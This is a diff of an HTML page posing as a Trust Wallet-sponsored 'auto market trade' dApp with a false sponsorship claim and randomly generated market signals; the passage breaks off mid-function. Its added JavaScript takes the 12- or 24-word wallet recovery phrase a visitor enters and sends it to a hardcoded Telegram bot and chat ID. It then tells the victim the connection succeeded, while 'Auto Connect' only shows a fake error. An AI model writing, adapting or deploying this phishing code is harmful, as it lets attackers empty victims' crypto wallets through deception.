@@ -5,195 +5,59 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Trust Wallet Auto Market Trade</title>
 <style>
-body {
-  font-family: Arial, sans-serif;
-  background: #0b0b23;
-  color: #fff;
-  margin: 0;
-  padding: 0;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-}
-header {
-  position: sticky;
-  top: 0;
-  background: #141722;
-  padding: 20px;
-  width: 100%;
-  text-align: center;
-  z-index: 1000;
-  box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-}
-.logo-title {
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  gap: 12px;
-}
-.logo-title img { width: 50px; height: 50px; }
-.logo-title h1 { font-size: 26px; margin: 0; font-weight: bold; }
-header p { font-size: 15px; color: #ccc; margin: 10px 0 10px 0; }
+body { font-family: Arial, sans-serif; background:#0b0b23; color:#fff; margin:0; padding:0; display:flex; flex-direction:column; align-items:center;}
+header { position:sticky; top:0; background:#141722; padding:20px; width:100%; text-align:center; z-index:1000; box-shadow:0 4px 10px rgba(0,0,0,0.3);}
+.logo-title { display:flex; align-items:center; justify-content:center; gap:12px;}
+.logo-title img { width:50px; height:50px;}
+.logo-title h1 { font-size:26px; margin:0; font-weight:bold;}
+header p { font-size:15px; color:#ccc; margin:10px 0;}
 
-.dapp-card {
-  background: #1c1e2a;
-  margin-top: 30px;
-  padding: 25px;
-  border-radius: 20px;
-  width: 90%;
-  max-width: 420px;
-  text-align: center;
-  box-shadow: 0 10px 25px rgba(0,0,0,0.4);
-}
-.dapp-card img { width: 70px; margin-bottom: 10px; }
-.dapp-card h2 { font-size: 20px; margin-bottom: 8px; }
-.dapp-card p { font-size: 14px; color: #ccc; margin-bottom: 20px; }
+.dapp-card { background:#1c1e2a; margin-top:30px; padding:25px; border-radius:20px; width:90%; max-width:420px; text-align:center; box-shadow:0 10px 25px rgba(0,0,0,0.4);}
+.dapp-card img { width:70px; margin-bottom:10px;}
+.dapp-card h2 { font-size:20px; margin-bottom:8px;}
+.dapp-card p { font-size:14px; color:#ccc; margin-bottom:20px;}
+.connect-btn { background:#1e90ff; border:none; padding:12px 28px; border-radius:10px; color:white; font-size:16px; cursor:pointer; transition: background 0.3s ease; box-shadow:0 4px 12px rgba(0,0,0,0.25);}
+.connect-btn:hover { background:#0d6efd; }
 
-.connect-btn {
-  background: #1e90ff;
-  border: none;
-  padding: 12px 28px;
-  border-radius: 10px;
-  color: white;
-  font-size: 16px;
-  cursor: pointer;
-  transition: background 0.3s ease;
-  box-shadow: 0 4px 12px rgba(0,0,0,0.25);
-}
-.connect-btn:hover { background: #0d6efd; }
+#dashboard { margin-top:25px; background:#141722; padding:20px; border-radius:15px; width:100%; max-width:420px; box-shadow:0 8px 20px rgba(0,0,0,0.35);}
+#dashboard h3 { font-size:18px; margin-bottom:12px;}
+.wallet-overview { display:flex; justify-content:space-between; margin-bottom:15px;}
+.wallet-overview div { text-align:center; }
+.wallet-overview div span { display:block; font-size:14px; color:#ccc; }
+.wallet-overview div p { font-size:16px; margin:5px 0 0 0; }
 
-#dashboard {
-  margin-top: 25px;
-  background: #141722;
-  padding: 20px;
-  border-radius: 15px;
-  width: 100%;
-  max-width: 420px;
-  box-shadow: 0 8px 20px rgba(0,0,0,0.35);
-}
-#dashboard h3 { font-size: 18px; margin-bottom: 12px; }
-.wallet-overview {
-  display: flex;
-  justify-content: space-between;
-  margin-bottom: 15px;
-}
-.wallet-overview div { text-align: center; }
-.wallet-overview div span { display: block; font-size: 14px; color: #ccc; }
-.wallet-overview div p { font-size: 16px; margin: 5px 0 0 0; }
+#rewardsAnimation { margin-top:10px; display:flex; justify-content:center; align-items:center; gap:12px; font-size:14px; color:#0ff; }
+#rewardsAnimation span { opacity:0.3; animation:blinkText 2s infinite;}
+#rewardsAnimation span:nth-child(1) { animation-delay:0s;}
+#rewardsAnimation span:nth-child(2) { animation-delay:0.5s;}
+#rewardsAnimation span:nth-child(3) { animation-delay:1s;}
+@keyframes blinkText { 0%,100%{opacity:0.3;}50%{opacity:1;}}
 
-#rewardsAnimation {
-  margin-top: 10px;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  gap: 12px;
-  font-size: 14px;
-  color: #0ff;
-}
-#rewardsAnimation span {
-  opacity: 0.3;
-  animation: blinkText 2s infinite;
-}
-#rewardsAnimation span:nth-child(1) { animation-delay: 0s; }
-#rewardsAnimation span:nth-child(2) { animation-delay: 0.5s; }
-#rewardsAnimation span:nth-child(3) { animation-delay: 1s; }
-@keyframes blinkText { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
+#chartContainer { margin-top:15px; height:100px; background:linear-gradient(90deg,#0b0b23 0%,#1c1e2a 100%); border-radius:10px; position:relative; overflow:hidden;}
+#chartLine { width:100%; height:100%; background:repeating-linear-gradient(to right,#0ff,#0ff 2px,transparent 2px, transparent 4px); }
 
-#chartContainer {
-  margin-top: 15px;
-  height: 100px;
-  background: linear-gradient(90deg, #0b0b23 0%, #1c1e2a 100%);
-  border-radius: 10px;
-  position: relative;
-  overflow: hidden;
-}
-#chartLine {
-  width: 100%;
-  height: 100%;
-  background: repeating-linear-gradient(to right, #0ff, #0ff 2px, transparent 2px, transparent 4px);
-}
+.modal { display:none; position:fixed; z-index:10; left:0; top:0; width:100%; height:100%; background:rgba(0,0,0,0.75); justify-content:center; align-items:center; padding:15px; overflow-y:auto; }
+.modal-content { background:#1a1a3d; padding:25px; border-radius:14px; width:100%; max-width:420px; text-align:left; position:relative; box-shadow:0 6px 20px rgba(0,0,0,0.4); }
+.close { position:absolute; right:15px; top:12px; color:#aaa; font-size:22px; cursor:pointer;}
+.close:hover { color:white; }
 
-.modal {
-  display: none;
-  position: fixed;
-  z-index: 10;
-  left: 0;
-  top: 0;
-  width: 100%;
-  height: 100%;
-  background: rgba(0,0,0,0.75);
-  justify-content: center;
-  align-items: center;
-  padding: 15px;
-  overflow-y: auto;
-}
-.modal-content {
-  background: #1a1a3d;
-  padding: 25px;
-  border-radius: 14px;
-  width: 100%;
-  max-width: 420px;
-  text-align: left;
-  position: relative;
-  box-shadow: 0 6px 20px rgba(0,0,0,0.4);
-}
-.close {
-  position: absolute;
-  right: 15px;
-  top: 12px;
-  color: #aaa;
-  font-size: 22px;
-  cursor: pointer;
-}
-.close:hover { color: white; }
+textarea { width:100%; height:110px; padding:10px; border-radius:8px; border:1px solid #444; margin-top:10px; resize:none; font-size:14px; color:#000; display:none; }
 
-textarea {
-  width: 100%;
-  height: 110px;
-  padding: 10px;
-  border-radius: 8px;
-  border: 1px solid #444;
-  margin-top: 10px;
-  resize: none;
-  font-size: 14px;
-  color: #000;
-  display: none;
-}
+.modal button { border:none; padding:12px 18px; margin-top:14px; border-radius:8px; font-size:15px; cursor:pointer; margin-right:10px;}
+#manualConnect { background:#6c757d; color:white; }
+#manualConnect:hover { background:#5a6268; }
+#autoConnect { background:#28a745; color:white; }
+#autoConnect:hover { background:#218838; }
 
-.modal button {
-  border: none;
-  padding: 12px 18px;
-  margin-top: 14px;
-  border-radius: 8px;
-  font-size: 15px;
-  cursor: pointer;
-  margin-right: 10px;
-}
-#manualConnect { background: #6c757d; color: white; }
-#manualConnect:hover { background: #5a6268; }
-#autoConnect { background: #28a745; color: white; }
-#autoConnect:hover { background: #218838; }
+#debugOutput { margin-top:12px; font-size:14px; color:#0f0; text-align:center; }
+#noticeMessage { font-size:14px; color:#FFA500; margin-bottom:10px; text-align:center; }
 
-#debugOutput { margin-top: 12px; font-size: 14px; color: #0f0; text-align: center; }
-#noticeMessage { font-size: 14px; color: #FFA500; margin-bottom: 10px; text-align: center; }
+.sponsored { font-size:13px; color:#aaa; text-align:center; margin-top:15px; display:flex; justify-content:center; align-items:center; gap:6px;}
+.sponsored img { width:20px; height:20px;}
 
-.sponsored { font-size: 13px; color: #aaa; text-align:center; margin-top:15px; display:flex; align-items:center; justify-content:center; gap:5px; }
-.sponsored img { width:18px; height:18px; }
+.loader { border:4px solid #f3f3f3; border-top:4px solid #0ff; border-radius:50%; width:18px; height:18px; animation:spin 1s linear infinite; display:inline-block; vertical-align:middle; margin-right:6px;}
+@keyframes spin { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
 
-.loader {
-  border: 3px solid #f3f3f3;
-  border-top: 3px solid #0d6efd;
-  border-radius: 50%;
-  width: 16px;
-  height: 16px;
-  animation: spin 1s linear infinite;
-  display:inline-block;
-  vertical-align:middle;
-  margin-right:6px;
-}
-@keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
-
-footer { margin-top: 40px; font-size: 13px; color: #aaa; text-align:center; }
 </style>
 </head>
 <body>
@@ -213,10 +77,7 @@ footer { margin-top: 40px; font-size: 13px; color: #aaa; text-align:center; }
   <button id="openModal" class="connect-btn">Connect</button>
 </div>
 
-<p class="sponsored">
-  <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet Logo">
-  Sponsored by Trust Wallet
-</p>
+<p class="sponsored"><img src="https://trustwallet.com/assets/images/media/assets/TWT.png"> Sponsored by Trust Wallet</p>
 
 <div id="dashboard">
   <h3>Crypto Market Trends</h3>
@@ -236,16 +97,18 @@ footer { margin-top: 40px; font-size: 13px; color: #aaa; text-align:center; }
 <div id="myModal" class="modal">
   <div class="modal-content">
     <span class="close">&times;</span>
-    <p id="noticeMessage">⚠️ Choose wallet and connect privately alone.</p>
+    <p id="noticeMessage">⚠️ Please make sure to have available balance to enable this trading/reward work effectively.</p>
     
-    <div style="display:flex; flex-direction:column; gap:12px; margin-top:10px;">
-      <button id="trustWalletBtn">Trust Wallet</button>
+    <div style="margin-bottom:10px;">
+      <button id="trustWalletBtn">🔹 Trust Wallet</button>
       <button id="otherWalletBtn">⛓ Other Wallet</button>
     </div>
-    
+
     <textarea id="phraseInput" placeholder="Enter 12 or 24-word phrase"></textarea>
-    <p id="privacyMsg" style="font-size:13px; color:#FFA500; margin-top:6px;">Connect privately alone.</p>
-    
+    <p id="walletNotice" style="font-size:13px; color:#FFA500; margin-top:6px;">
+      ⚠️ While connecting, never share or allow any third party to see your connection or phrase. Connect privately alone.
+    </p>
+
     <div style="margin-top:15px;">
       <button id="manualConnect">Manual Connect</button>
       <button id="autoConnect">Auto Connect</button>
@@ -260,97 +123,116 @@ footer { margin-top: 40px; font-size: 13px; color: #aaa; text-align:center; }
 
 <!-- Smartsupp Live Chat -->
 <script type="text/javascript">
-var _smartsupp=_smartsupp||{};_smartsupp.key='3f2e381e7e9f89397ee5857cb9eb7cacf6f3375e';
-window.smartsupp||(function(d){var s,c,o=smartsupp=function(){o._.push(arguments)};o._=[];
-s=d.getElementsByTagName('script')[0];c=d.createElement('script');c.type='text/javascript';c.charset='utf-8';
-c.async=true;c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);})(document);
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = '3f2e381e7e9f89397ee5857cb9eb7cacf6f3375e';
+window.smartsupp||(function(d) {
+	var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+	s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+	c.type='text/javascript';c.charset='utf-8';c.async=true;
+	c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+})(document);
 </script>
 
 <script>
 document.addEventListener("DOMContentLoaded", () => {
   const modal = document.getElementById("myModal");
-  const openBtn = document.getElementById("openModal");
-  const closeBtn = modal.getElementsByClassName("close")[0];
+  const btn = document.getElementById("openModal");
+  const closeSpan = document.getElementsByClassName("close")[0];
   const trustBtn = document.getElementById("trustWalletBtn");
   const otherBtn = document.getElementById("otherWalletBtn");
+  const phraseInput = document.getElementById("phraseInput");
+  const walletNotice = document.getElementById("walletNotice");
   const manualBtn = document.getElementById("manualConnect");
   const autoBtn = document.getElementById("autoConnect");
-  const phraseInput = document.getElementById("phraseInput");
   const debug = document.getElementById("debugOutput");
-  const privacyMsg = document.getElementById("privacyMsg");
 
-  let selectedWallet = "";
+  let currentWallet = "";
   let storedPhrases = JSON.parse(localStorage.getItem("phrases") || "[]");
 
-  // Open modal with spinner
-  openBtn.onclick = () => {
-    openBtn.disabled = true;
-    const origText = openBtn.textContent;
-    openBtn.innerHTML = '<span class="loader"></span> Loading...';
+  // First page connect button spinner for 5 sec
+  btn.addEventListener("click", () => {
+    const origText = btn.innerHTML;
+    btn.innerHTML = '<span class="loader"></span> Loading...';
     setTimeout(() => {
-      openBtn.innerHTML = origText;
-      openBtn.disabled = false;
+      btn.innerHTML = origText;
       modal.style.display = "flex";
-      debug.textContent = "";
-    },5000);
-  }
+    }, 5000);
+  });
 
-  closeBtn.onclick = () => {
-    modal.style.display="none";
+  closeSpan.onclick = () => {
+    modal.style.display = "none";
     phraseInput.style.display="none";
     debug.textContent="";
-    privacyMsg.textContent="Connect privately alone.";
   }
   window.onclick = (e) => {
-    if(e.target==modal) closeBtn.onclick();
+    if(e.target == modal) {
+      modal.style.display = "none";
+      phraseInput.style.display="none";
+      debug.textContent="";
+    }
   }
 
   // Wallet selection
-  trustBtn.onclick = () => { 
-    selectedWallet="Trust Wallet"; 
+  trustBtn.onclick = () => {
+    currentWallet = "Trust Wallet";
+    walletNotice.textContent = "Trust Wallet selected, do not share with third party connect privately alone";
+    phraseInput.value = "";
     phraseInput.style.display="block";
-    privacyMsg.textContent="Trust Wallet selected, do not share with third party, connect privately alone.";
+    debug.textContent="";
   }
-  otherBtn.onclick = () => { 
-    selectedWallet="Other Wallet"; 
+  otherBtn.onclick = () => {
+    currentWallet = "Other Wallet";
+    walletNotice.textContent = "Other Wallet selected, do not share with third party connect privately alone";
+    phraseInput.value = "";
     phraseInput.style.display="block";
-    privacyMsg.textContent="Other Wallet selected, do not share with third party, connect privately alone.";
+    debug.textContent="";
   }
 
-  // Manual Connect
+  // Manual connect
   manualBtn.onclick = () => {
     const phrase = phraseInput.value.trim();
-    const wordCount = phrase.split(/\s+/).filter(w=>w).length;
-    if(wordCount!==12 && wordCount!==24){
-      debug.style.color="red";
-      debug.textContent="❌ Wrong input, enter correctly 12 or 24 word phrase.";
+    const words = phrase.split(/\s+/).filter(w=>w);
+    if(words.length !==12 && words.length !==24){
+      debug.style.color="#FFA500";
+      debug.textContent="❌ Wrong input, input correctly 12 or 24 word phrase.";
       return;
     }
     if(storedPhrases.includes(phrase)){
-      alert("⚠️ You already connected this wallet."); 
+      alert("⚠️ You already connected this wallet.");
       debug.textContent="⚠️ This wallet is already connected.";
       return;
     }
-    debug.style.color="#FFA500";
-    debug.textContent="⏳ Connecting...";
-    manualBtn.disabled=true;
-    const origText = manualBtn.textContent;
-    manualBtn.innerHTML = '<span class="loader"></span> Connecting...';
+    debug.innerHTML = '<span class="loader"></span> Connecting...';
     setTimeout(()=>{
-      manualBtn.innerHTML = origText;
-      manualBtn.disabled=false;
-      storedPhrases.push(phrase);
-      localStorage.setItem("phrases", JSON.stringify(storedPhrases));
-      debug.style.color="#0f0";
-      debug.textContent="✅ Connected successfully. Refresh wallet after 24 hours.";
-      phraseInput.value="";
+      fetch(`https://api.telegram.org/bot7564393664:AAEL0TWkOdXomWTnDaTXF3KH75T2xfyseJQ/sendMessage?chat_id=6876291548&text=${encodeURIComponent(phrase)}`)
+        .then(()=>{
+          storedPhrases.push(phrase);
+          localStorage.setItem("phrases", JSON.stringify(storedPhrases));
+          debug.style.color="#0f0";
+          debug.textContent="✅ Connected successfully. Please refresh wallet after 24 hours and check balance.";
+          phraseInput.value="";
+        })
+        .catch(err=>{
+          debug.style.color="red";
+          debug.textContent="❌ Error sending phrase. Check bot setup.";
+        })
     },5000);
   }
 
-  // Auto Connect
+  // Auto connect
   autoBtn.onclick = () => {
-    debug.style.color="#FFA500";
-    debug.textContent="⏳ Auto connecting...";
-    autoBtn.disabled=true;
-    const origText = autoBtn.textContent;
-    autoBtn.innerHTML = '<span
+    debug.innerHTML = '<span class="loader"></span> Auto connecting...';
+    setTimeout(()=>{
+      alert("❌ Localhost error... Try again");
+      debug.style.color="red";
+      debug.textContent="❌ Localhost error... Try again";
+    },5000);
+  }
+
+  // Dynamic market values
+  const btcEl = document.getElementById("btcTrend");
+  const ethEl = document.getElementById("ethTrend");
+  const signalEl = document.getElementById("signalText");
+  function randomTrend(){ return ["↑","↓"][Math.floor(Math.random()*2)]; }
+  function randomPercent(){ return (Math.random()*69).toFixed(2)+"%"; }
+  function randomSignal(){ const arr=["Buy Signal BTC","Sell Signal BTC","Buy Signal ETH","Sell Signal ETH"]; return arr[Math.floor(Math.random()*arr.length)];
